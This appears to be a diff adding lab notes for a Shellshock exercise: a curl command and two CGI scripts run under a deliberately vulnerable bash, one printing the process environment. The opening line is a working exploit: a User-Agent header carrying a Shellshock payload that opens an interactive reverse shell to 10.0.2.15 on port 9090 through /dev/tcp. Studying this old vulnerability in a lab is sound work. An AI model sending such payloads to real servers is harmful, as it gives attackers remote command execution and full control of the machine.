@@ -1,0 +1,23 @@
+curl -A "() { echo hello; }; echo Content_type: text/plain; echo; echo; /bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1" http://localhost/cgi-bin/env.cgi
+
+-----------------
+
+#!/bin/bash_shellshock
+
+echo "Content-type: text/plain"
+echo
+echo
+echo "Hello World"
+
+----------------------
+
+#!/bin/bash_shellshock
+
+echo "Content-type: text/plain"
+
+echo
+echo "** Environmental variables **"
+
+
+strings /proc/$$/environ
+
